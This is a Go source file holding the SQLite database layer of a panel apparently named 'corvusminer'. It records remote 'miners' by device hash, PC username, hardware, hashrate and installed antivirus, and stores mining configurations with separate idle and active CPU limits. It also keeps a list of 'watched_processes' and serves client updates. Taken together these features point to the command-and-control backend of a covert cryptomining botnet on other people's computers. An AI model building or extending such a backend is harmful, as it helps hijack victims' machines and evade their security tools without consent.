package database

import (
	"corvusminer/panel/models"
	"database/sql"
	"fmt"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

// DB wraps the sql.DB
type DB struct {
	*sql.DB
}

// InitDB initializes SQLite database and creates tables
func InitDB(dbPath string) (*DB, error) {
	sqlDB, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}

	if err = sqlDB.Ping(); err != nil {
		return nil, fmt.Errorf("failed to ping database: %w", err)
	}

	db := &DB{sqlDB}

	if err := db.createTables(); err != nil {
		return nil, fmt.Errorf("failed to create tables: %w", err)
	}

	return db, nil
}

// createTables creates necessary database tables
func (db *DB) createTables() error {
	minersTable := `
	CREATE TABLE IF NOT EXISTS miners (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		device_hash TEXT NOT NULL UNIQUE,
		pc_username TEXT NOT NULL,
		cpu_name TEXT,
		gpu_name TEXT,
		cpu_hashrate REAL DEFAULT 0,
		gpu_hashrate REAL DEFAULT 0,
		antivirus_name TEXT,
		device_uptime_min INTEGER DEFAULT 0,
		client_version TEXT DEFAULT '2.3.0',
		status TEXT DEFAULT 'online',
		last_seen INTEGER,
		created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
	);`

	configTable := `
	CREATE TABLE IF NOT EXISTS config (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		cpu_config TEXT,
		gpu_config TEXT,
		gpu_algo TEXT DEFAULT '',
		enable_cpu INTEGER DEFAULT 1,
		enable_gpu INTEGER DEFAULT 1,
		watched_processes TEXT DEFAULT '',
		updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
	);`

	usersTable := `
	CREATE TABLE IF NOT EXISTS users (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		username TEXT NOT NULL UNIQUE,
		password_hash TEXT NOT NULL,
		created_at INTEGER NOT NULL
	);`

	updatesTable := `
	CREATE TABLE IF NOT EXISTS updates (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		version TEXT NOT NULL UNIQUE,
		filename TEXT NOT NULL,
		is_current INTEGER DEFAULT 0,
		uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
	);`

	for _, schema := range []string{minersTable, configTable, usersTable, updatesTable} {
		if _, err := db.Exec(schema); err != nil {
			return fmt.Errorf("failed to execute schema: %w", err)
		}
	}

	// Migrate: add watched_processes column if it doesn't exist yet
	_, _ = db.Exec(`ALTER TABLE config ADD COLUMN watched_processes TEXT DEFAULT ''`)

	// Migrate: add client_version column if it doesn't exist yet (for existing databases)
	_, _ = db.Exec(`ALTER TABLE miners ADD COLUMN client_version TEXT DEFAULT '2.3.0'`)

	// Initialize default config if empty
	var count int
	if err := db.QueryRow("SELECT COUNT(*) FROM config").Scan(&count); err != nil {
		return err
	}

	if count == 0 {
		cpuCfg := `{"mining_url":"pool.example.com:3333","wallet":"wallet_addr","password":"x","non_idle_usage":50,"idle_usage":20,"wait_time_idle":300,"use_ssl":0}`
		gpuCfg := `{"mining_url":"pool.example.com:3333","wallet":"wallet_addr","password":"x","non_idle_usage":80,"idle_usage":30,"wait_time_idle":300,"use_ssl":0}`
		_, err := db.Exec(`
			INSERT INTO config (cpu_config, gpu_config, gpu_algo)
			VALUES (?, ?, ?)
		`, cpuCfg, gpuCfg, "kawpow")
		if err != nil {
			return err
		}
	}

	return nil
}

// GetMiners retrieves all miners
func (db *DB) GetMiners() ([]models.Miner, error) {
	rows, err := db.Query(`
		SELECT id, device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, client_version, status, last_seen, created_at
		FROM miners
		ORDER BY last_seen DESC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var miners []models.Miner
	for rows.Next() {
		var m models.Miner
		var createdAt time.Time
		if err := rows.Scan(&m.ID, &m.DeviceHash, &m.PCUsername, &m.CPUName, &m.GPUName, &m.CPUHashRate, &m.GPUHashRate, &m.AntivirusName, &m.DeviceUptimeMin, &m.ClientVersion, &m.Status, &m.LastSeen, &createdAt); err != nil {
			return nil, err
		}
		m.CreatedAt = createdAt.Unix()
		miners = append(miners, m)
	}

	return miners, rows.Err()
}

// UpsertMiner inserts or updates a miner by device_hash
func (db *DB) UpsertMiner(report *models.MinerReport) error {
	_, err := db.Exec(`
		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, client_version, status, last_seen)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(device_hash) DO UPDATE SET
			pc_username = excluded.pc_username,
			cpu_name = excluded.cpu_name,
			gpu_name = excluded.gpu_name,
			cpu_hashrate = excluded.cpu_hashrate,
			gpu_hashrate = excluded.gpu_hashrate,
			antivirus_name = excluded.antivirus_name,
			device_uptime_min = excluded.device_uptime_min,
			client_version = excluded.client_version,
			status = 'online',
			last_seen = excluded.last_seen
	`, report.DeviceHash, report.PCUsername, report.CPUName, report.GPUName, report.CPUHashrate, report.GPUHashrate, report.AntivirusName, report.DeviceUptimeMin, report.ClientVersion, "online", report.Timestamp)

	return err
}

// DeleteMiner removes a miner by ID
func (db *DB) DeleteMiner(id int) error {
	_, err := db.Exec("DELETE FROM miners WHERE id = ?", id)
	return err
}

// UpdateMinerStatus updates a miner's status and stats
func (db *DB) UpdateMinerStatus(id int, status string, cpuHashrate, gpuHashrate float64) error {
	_, err := db.Exec(`
		UPDATE miners
		SET status = ?, cpu_hashrate = ?, gpu_hashrate = ?, last_seen = ?
		WHERE id = ?
	`, status, cpuHashrate, gpuHashrate, time.Now().Unix(), id)
	return err
}

// MarkStaleMinerAsOffline marks miners as offline if they haven't reported within the timeout period
func (db *DB) MarkStaleMinerAsOffline(timeoutMinutes int) error {
	timeoutSeconds := int64(timeoutMinutes * 60)
	currentTime := time.Now().Unix()
	cutoffTime := currentTime - timeoutSeconds

	_, err := db.Exec(`
		UPDATE miners
		SET status = 'offline'
		WHERE status = 'online' AND last_seen < ?
	`, cutoffTime)

	return err
}

// DeleteStaleMiners deletes miners that haven't reported within the specified number of days
func (db *DB) DeleteStaleMiners(days int) (int64, error) {
	daySeconds := int64(days * 24 * 60 * 60)
	currentTime := time.Now().Unix()
	cutoffTime := currentTime - daySeconds

	result, err := db.Exec(`
		DELETE FROM miners
		WHERE last_seen < ?
	`, cutoffTime)

	if err != nil {
		return 0, err
	}

	rowsAffected, err := result.RowsAffected()
	return rowsAffected, err
}

// GetConfig retrieves configuration
func (db *DB) GetConfig() (*models.Config, error) {
	var cfg models.Config
	err := db.QueryRow(`
		SELECT id, cpu_config, gpu_config, gpu_algo, enable_cpu, enable_gpu, watched_processes
		FROM config
		LIMIT 1
	`).Scan(&cfg.ID, &cfg.CPUConfig, &cfg.GPUConfig, &cfg.GPUAlgo, &cfg.EnableCPU, &cfg.EnableGPU, &cfg.WatchedProcesses)

	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}

	return &cfg, nil
}

// UpdateConfig updates configuration
func (db *DB) UpdateConfig(cfg models.Config) error {
	_, err := db.Exec(`
		UPDATE config
		SET cpu_config = ?, gpu_config = ?, gpu_algo = ?, enable_cpu = ?, enable_gpu = ?, watched_processes = ?, updated_at = CURRENT_TIMESTAMP
		WHERE id = ?
	`, cfg.CPUConfig, cfg.GPUConfig, cfg.GPUAlgo, cfg.EnableCPU, cfg.EnableGPU, cfg.WatchedProcesses, cfg.ID)
	return err
}

// CreateUser creates a new user
func (db *DB) CreateUser(username, passwordHash string) error {
	_, err := db.Exec(`
		INSERT INTO users (username, password_hash, created_at)
		VALUES (?, ?, ?)
	`, username, passwordHash, time.Now().Unix())
	return err
}

// GetUserByUsername retrieves user by username
func (db *DB) GetUserByUsername(username string) (*models.User, error) {
	var user models.User
	err := db.QueryRow(`
		SELECT id, username, password_hash, created_at
		FROM users
		WHERE username = ?
	`, username).Scan(&user.ID, &user.Username, &user.PasswordHash, &user.CreatedAt)

	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}

	return &user, nil
}

// HasAnyUsers checks if any users exist in the database
func (db *DB) HasAnyUsers() (bool, error) {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM users").Scan(&count)
	if err != nil {
		return false, err
	}
	return count > 0, nil
}

// AddUpdate adds a new client update to the database
func (db *DB) AddUpdate(version, filename string, isCurrent bool) error {
	currentVal := 0
	if isCurrent {
		// If this is being set as current, unset any previous current
		_, _ = db.Exec(`UPDATE updates SET is_current = 0`)
		currentVal = 1
	}

	_, err := db.Exec(`
		INSERT INTO updates (version, filename, is_current)
		VALUES (?, ?, ?)
	`, version, filename, currentVal)

	return err
}

// GetUpdates retrieves all updates ordered by upload date (newest first)
func (db *DB) GetUpdates() ([]map[string]interface{}, error) {
	rows, err := db.Query(`
		SELECT id, version, filename, is_current, uploaded_at
		FROM updates
		ORDER BY uploaded_at DESC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var updates []map[string]interface{}
	for rows.Next() {
		var id int
		var version, filename string
		var isCurrent int
		var uploadedAt time.Time

		if err := rows.Scan(&id, &version, &filename, &isCurrent, &uploadedAt); err != nil {
			return nil, err
		}

		updates = append(updates, map[string]interface{}{
			"id":          id,
			"version":     version,
			"filename":    filename,
			"is_current":  isCurrent == 1,
			"uploaded_at": uploadedAt,
		})
	}

	return updates, rows.Err()
}

// SetCurrentUpdate sets a specific update as the current version
func (db *DB) SetCurrentUpdate(id int) error {
	_, err := db.Exec(`UPDATE updates SET is_current = 0`)
	if err != nil {
		return err
	}

	_, err = db.Exec(`UPDATE updates SET is_current = 1 WHERE id = ?`, id)
	return err
}

// GetCurrentUpdate gets the current/latest version
func (db *DB) GetCurrentUpdate() (map[string]interface{}, error) {
	var id int
	var version, filename string
	var uploadedAt time.Time

	err := db.QueryRow(`
		SELECT id, version, filename, uploaded_at
		FROM updates
		WHERE is_current = 1
		LIMIT 1
	`).Scan(&id, &version, &filename, &uploadedAt)

	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}

	return map[string]interface{}{
		"id":          id,
		"version":     version,
		"filename":    filename,
		"uploaded_at": uploadedAt,
	}, nil
}

// DeleteUpdate removes an update and its file
func (db *DB) DeleteUpdate(id int) (string, error) {
	var filename string

	// Get filename first
	err := db.QueryRow("SELECT filename FROM updates WHERE id = ?", id).Scan(&filename)
	if err != nil {
		return "", err
	}

	// Delete from database
	_, err = db.Exec("DELETE FROM updates WHERE id = ?", id)
	if err != nil {
		return filename, err
	}

	return filename, nil
}
